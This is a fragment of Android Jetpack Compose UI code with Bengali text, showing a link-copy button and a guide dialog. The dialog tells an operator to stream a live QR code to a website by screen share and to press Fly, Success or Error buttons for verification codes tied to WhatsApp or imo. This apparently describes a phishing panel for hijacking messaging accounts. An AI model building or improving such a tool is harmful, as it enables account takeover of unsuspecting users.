                            .weight(1f)
                            .height(48.dp)
                            .testTag("copy_readymade_web_button")
                    ) {
                        Icon(
                            imageVector = Icons.Default.ContentCopy,
                            contentDescription = null,
                            tint = bottomAccentColor,
                            modifier = Modifier.size(17.dp)
                        )
                        Spacer(modifier = Modifier.width(6.dp))
                        Text(
                            text = "একক লিংক কপি",
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Bold,
                            color = bottomAccentColor,
                            maxLines = 1
                        )
                    }
                }
            }
        }

        if (showScreenShareGuideDialog) {
            AlertDialog(
                onDismissRequest = onCloseScreenShareGuide,
                icon = {
                    Icon(
                        imageVector = Icons.Default.Info,
                        contentDescription = "Info icon",
                        tint = Color(0xFF155E44),
                        modifier = Modifier.size(28.dp)
                    )
                },
                title = {
                    Text(
                        text = "স্ক্রিন শেয়ার ও একক লিংক নির্দেশিকা",
                        fontSize = 18.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color(0xFF1C1E21)
                    )
                },
                text = {
                    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                        Text(
                            text = "সহজ ৩টি ধাপ:",
                            fontWeight = FontWeight.SemiBold,
                            fontSize = 14.sp,
                            color = Color(0xFF155E44)
                        )
                        Text(
                            text = "১. উপরে WhatsApp অথবা imo বাটনে চাপ দিলে একই ওয়েবসাইট লিংক সাথে সাথে সেই ওয়েবসাইটে সুইচ হয়ে যাবে।",
                            fontSize = 13.sp,
                            color = Color(0xFF333333)
                        )
                        Text(
                            text = "২. 'স্ক্রিন শেয়ার চালু করুন' বাটনে চাপ দিয়ে Start now নির্বাচন করলে লাইভ কিউআর কোড ওয়েবসাইটে দেখা যাবে।",
                            fontSize = 13.sp,
                            color = Color(0xFF333333)
                        )
                        Text(
                            text = "৩. কোড পাঠাতে Fly, ভেরিফিকেশন সম্পন্ন করতে Success বাটন এবং ভুল কোডে Error বাটন চাপুন।",
                            fontSize = 13.sp,
                            color = Color(0xFF333333)
                        )
                    }
                },
                confirmButton = {
                    Button(
                        onClick = onSpeakGuide,
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF155E44))
                    ) {
                        Icon(
                            imageVector = Icons.AutoMirrored.Filled.VolumeUp,
                            contentDescription = null,
                            modifier = Modifier.size(16.dp)
                        )
                        Spacer(modifier = Modifier.width(4.dp))
                        Text("ভয়েস শুনুন")
                    }
                },
                dismissButton = {
                    TextButton(onClick = onCloseScreenShareGuide) {
                        Text("বুঝেছি", color = Color(0xFF155E44))
                    }
                }
            )
        }
    }
}
